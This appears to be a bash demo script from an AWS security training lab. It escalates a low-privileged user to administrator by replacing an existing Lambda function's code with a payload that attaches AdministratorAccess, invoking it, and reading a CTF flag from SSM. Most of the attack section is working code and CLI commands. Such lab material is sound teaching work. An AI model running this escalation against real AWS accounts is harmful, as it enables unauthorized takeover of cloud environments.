#!/bin/bash

# Demo script for lambda:UpdateFunctionCode + lambda:InvokeFunction privilege escalation
# This scenario demonstrates how a user with both lambda:UpdateFunctionCode and lambda:InvokeFunction
# can modify existing Lambda function code and manually invoke it to execute malicious logic
# under the function's privileged role and gain admin access


# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-lambda-004-to-admin-starting-user"
TARGET_LAMBDA="pl-prod-lambda-004-to-admin-target-lambda"
TARGET_ROLE="pl-prod-lambda-004-to-admin-target-role"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}Lambda UpdateFunctionCode + InvokeFunction Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output using the grouped output pattern
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_lambda_004_lambda_updatefunctioncode_lambda_invokefunction.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials from the grouped output
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Get region
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

# Extract readonly credentials for observation/polling steps
READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Credential switching helpers
use_starting_creds() {
    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
    unset AWS_SESSION_TOKEN
}
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}

# Source demo permissions library for validation restriction
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/../../../../../../scripts/lib/demo_permissions.sh"

# Restrict helpful permissions during validation run
restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"

# [EXPLOIT] Step 2: Verify starting user identity
echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION

echo "Using region: $AWS_REGION"

show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# [OBSERVATION] Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
use_readonly_creds
show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# [EXPLOIT] Step 4: Verify we don't have admin permissions yet
echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
use_starting_creds
echo "Attempting to list IAM users (should fail)..."
show_cmd "Attacker" "aws iam list-users --max-items 1"
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (as expected)${NC}"
fi
echo ""

# [OBSERVATION] Step 5: Get target Lambda function details
echo -e "${YELLOW}Step 5: Discovering target Lambda function${NC}"
echo "Target Lambda function: $TARGET_LAMBDA"
use_readonly_creds

# Get function details
show_cmd "ReadOnly" "aws lambda get-function --region $AWS_REGION --function-name $TARGET_LAMBDA --output json"
FUNCTION_INFO=$(aws lambda get-function \
    --region $AWS_REGION \
    --function-name $TARGET_LAMBDA \
    --output json 2>/dev/null)

if [ $? -ne 0 ]; then
    echo -e "${RED}Error: Could not get Lambda function details${NC}"
    exit 1
fi

# Extract handler name and role
HANDLER_NAME=$(echo "$FUNCTION_INFO" | jq -r '.Configuration.Handler')
FUNCTION_ROLE=$(echo "$FUNCTION_INFO" | jq -r '.Configuration.Role')
RUNTIME=$(echo "$FUNCTION_INFO" | jq -r '.Configuration.Runtime')

echo "Handler: $HANDLER_NAME"
echo "Runtime: $RUNTIME"
echo "Execution Role: $FUNCTION_ROLE"
echo -e "${GREEN}✓ Retrieved function details${NC}"
echo ""
echo -e "${BLUE}Key observation:${NC}"
echo "This Lambda function runs with a privileged role that has administrative permissions."
echo "If we can update the code and invoke it, we can execute arbitrary code with those permissions!"
echo ""

# Step 6: Backup original Lambda function code
echo -e "${YELLOW}Step 6: Backing up original Lambda function code${NC}"
echo "Downloading original code for restoration after demo..."

# Get the code location
CODE_LOCATION=$(echo "$FUNCTION_INFO" | jq -r '.Code.Location')

# Download original code
curl -s "$CODE_LOCATION" -o /tmp/original_lambda_backup.zip

if [ $? -eq 0 ]; then
    echo -e "${GREEN}✓ Original code backed up to /tmp/original_lambda_backup.zip${NC}"
else
    echo -e "${RED}Error: Could not backup original code${NC}"
    exit 1
fi
echo ""

# Step 7: Create malicious Lambda function code
echo -e "${YELLOW}Step 7: Creating malicious Lambda function code${NC}"
echo "Creating Python code that will attach AdministratorAccess to our user..."

# CRITICAL: Filename must match handler name
# Handler is "lambda_function.lambda_handler" so file must be "lambda_function.py"
cat > /tmp/lambda_function.py << EOF
import json
import boto3
import os

def lambda_handler(event, context):
    """
    Malicious Lambda function that attaches AdministratorAccess policy to the starting user.
    This function runs with the privileged role attached to the Lambda function.
    """
    iam = boto3.client('iam')
    target_user = '$STARTING_USER'
    policy_arn = 'arn:aws:iam::aws:policy/AdministratorAccess'

    try:
        # Attach AdministratorAccess to the starting user
        iam.attach_user_policy(
            UserName=target_user,
            PolicyArn=policy_arn
        )

        message = f'Successfully attached AdministratorAccess to {target_user}'
        print(message)

        return {
            'statusCode': 200,
            'body': json.dumps({
                'success': True,
                'message': message,
                'target_user': target_user,
                'policy_arn': policy_arn
            })
        }
    except Exception as e:
        error_message = f'Error attaching policy: {str(e)}'
        print(error_message)
        return {
            'statusCode': 500,
            'body': json.dumps({
                'success': False,
                'error': error_message
            })
        }
EOF

echo -e "${GREEN}✓ Malicious code created${NC}\n"

# Step 8: Package the malicious code
echo -e "${YELLOW}Step 8: Packaging malicious code into deployment package${NC}"
cd /tmp
zip -q lambda_function.zip lambda_function.py
cd - > /dev/null

if [ -f /tmp/lambda_function.zip ]; then
    echo -e "${GREEN}✓ Malicious code packaged${NC}"
else
    echo -e "${RED}Error: Failed to create zip file${NC}"
    rm -f /tmp/lambda_function.py
    exit 1
fi
echo ""

# [EXPLOIT] Step 9: Update Lambda function code (FIRST PRIVILEGE ESCALATION STEP)
echo -e "${YELLOW}Step 9: Updating Lambda function code with malicious payload${NC}"
echo -e "${BLUE}Attack Vector: lambda:UpdateFunctionCode${NC}"
echo "Function: $TARGET_LAMBDA"
echo ""
echo "Executing: aws lambda update-function-code --function-name $TARGET_LAMBDA"
use_starting_creds
export AWS_REGION=$AWS_REGION

show_attack_cmd "Attacker" "aws lambda update-function-code --region $AWS_REGION --function-name $TARGET_LAMBDA --zip-file fileb:///tmp/lambda_function.zip --output json"
UPDATE_RESULT=$(aws lambda update-function-code \
    --region $AWS_REGION \
    --function-name $TARGET_LAMBDA \
    --zip-file fileb:///tmp/lambda_function.zip \
    --output json 2>&1)

if [ $? -eq 0 ]; then
    LAST_UPDATE_STATUS=$(echo "$UPDATE_RESULT" | jq -r '.LastUpdateStatus')
    echo "Update Status: $LAST_UPDATE_STATUS"
    echo -e "${GREEN}✓ Successfully updated Lambda function code!${NC}"
else
    echo -e "${RED}Error: Failed to update Lambda function code${NC}"
    echo "$UPDATE_RESULT"
    rm -f /tmp/lambda_function.py /tmp/lambda_function.zip
    exit 1
fi
echo ""

# Step 10: Wait for Lambda to process the update
echo -e "${YELLOW}Step 10: Waiting for Lambda to process code update${NC}"
echo "Allowing time for Lambda to deploy the new code..."
sleep 15
echo -e "${GREEN}✓ Lambda function updated${NC}\n"

# [EXPLOIT] Step 11: Invoke the malicious Lambda function (SECOND PRIVILEGE ESCALATION STEP)
echo -e "${YELLOW}Step 11: Manually invoking Lambda function to execute privilege escalation${NC}"
echo -e "${BLUE}Attack Vector: lambda:InvokeFunction${NC}"
echo "Function: $TARGET_LAMBDA"
echo ""
echo "This is where the privilege escalation occurs!"
echo "By invoking the function, our malicious code executes with the Lambda's admin role."
echo ""
echo "Executing: aws lambda invoke --function-name $TARGET_LAMBDA"
use_starting_creds

show_attack_cmd "Attacker" "aws lambda invoke --region $AWS_REGION --function-name $TARGET_LAMBDA --payload '{}' /tmp/response.json --output json"
aws lambda invoke \
    --region $AWS_REGION \
    --function-name $TARGET_LAMBDA \
    --payload '{}' \
    /tmp/response.json \
    --output json > /dev/null

if [ $? -eq 0 ]; then
    echo -e "${GREEN}✓ Lambda function invoked successfully${NC}"
    echo ""
    echo "Response from Lambda function:"
    cat /tmp/response.json | jq '.'
    echo ""
else
    echo -e "${RED}Error: Failed to invoke Lambda function${NC}"
    rm -f /tmp/lambda_function.py /tmp/lambda_function.zip /tmp/response.json /tmp/original_lambda_backup.zip
    exit 1
fi

# Step 12: Wait for IAM policy propagation
echo -e "${YELLOW}Step 12: Waiting for IAM policy to propagate${NC}"
echo "IAM changes can take time to propagate across AWS..."
sleep 15
echo -e "${GREEN}✓ Policy should be propagated${NC}\n"

# [EXPLOIT] Step 13: Verify administrator access
echo -e "${YELLOW}Step 13: Verifying administrator access${NC}"
echo "Attempting to list IAM users to confirm admin access..."
echo ""
use_starting_creds

show_attack_cmd "Attacker (now admin)" "aws iam list-users --max-items 3 --output table"
if aws iam list-users --max-items 3 --output table; then
    echo ""
    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
else
    echo -e "${RED}✗ Failed to list users${NC}"
    echo -e "${YELLOW}Note: IAM propagation can take longer than expected. Try waiting 30 more seconds and test again.${NC}"
fi
echo ""

# Clean up temporary files (keep backup for cleanup script)
rm -f /tmp/lambda_function.py /tmp/lambda_function.zip /tmp/response.json

# [EXPLOIT] Step 14: Capture the CTF flag
# The starting user now has AdministratorAccess attached, which grants ssm:GetParameter
# implicitly. Use those credentials to read the scenario flag from SSM Parameter Store.
use_starting_creds
echo -e "${YELLOW}Step 14: Capturing CTF flag from SSM Parameter Store${NC}"
FLAG_PARAM_NAME="/pathfinding-labs/flags/lambda-004-to-admin"
show_attack_cmd "Attacker (now admin)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text"
FLAG_VALUE=$(aws ssm get-parameter --name "$FLAG_PARAM_NAME" --query 'Parameter.Value' --output text 2>/dev/null)

if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
    echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
else
    echo -e "${RED}✗ Failed to read flag from $FLAG_PARAM_NAME${NC}"
    exit 1
fi
echo ""

# Summary
# Restore helpful permissions for manual exploration
restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"

echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ CTF FLAG CAPTURED!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (with lambda:UpdateFunctionCode + lambda:InvokeFunction)"
echo "2. Discovered existing Lambda function: $TARGET_LAMBDA with privileged role"
echo "3. Lambda function execution role: $TARGET_ROLE (has admin permissions)"
echo "4. Updated Lambda function code with malicious payload using lambda:UpdateFunctionCode"
echo "5. Manually invoked Lambda function using lambda:InvokeFunction to execute payload"
echo "6. Malicious code ran with admin privileges and attached AdministratorAccess to our user"
echo "7. Achieved: Administrator Access"
echo "8. Captured CTF flag from SSM Parameter Store: $FLAG_VALUE"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo -e "  $STARTING_USER"
echo -e "  → (lambda:UpdateFunctionCode) → Modify $TARGET_LAMBDA code"
echo -e "  → (lambda:InvokeFunction) → Execute modified function"
echo -e "  → Function runs as $TARGET_ROLE"
echo -e "  → (iam:AttachUserPolicy) → Attach AdministratorAccess"
echo -e "  → (ssm:GetParameter) → CTF Flag"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo -e "\n${YELLOW}Why This Works:${NC}"
echo "- lambda:UpdateFunctionCode allows modifying the function's code"
echo "- lambda:InvokeFunction allows manually triggering the function"
echo "- The Lambda function executes with its assigned IAM role's permissions"
echo "- The role has administrative permissions (can attach IAM policies)"
echo "- Our malicious code leverages these permissions to escalate our own privileges"

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- Modified Lambda function: $TARGET_LAMBDA"
echo "- Attached policy: AdministratorAccess to $STARTING_USER"
echo "- Backup of original code: /tmp/original_lambda_backup.zip"

echo -e "\n${RED}⚠ Warning: The Lambda function code has been modified${NC}"
echo -e "${RED}⚠ Warning: AdministratorAccess policy is attached to $STARTING_USER${NC}"
echo ""
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack.sh or use the plabs TUI/CLI"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
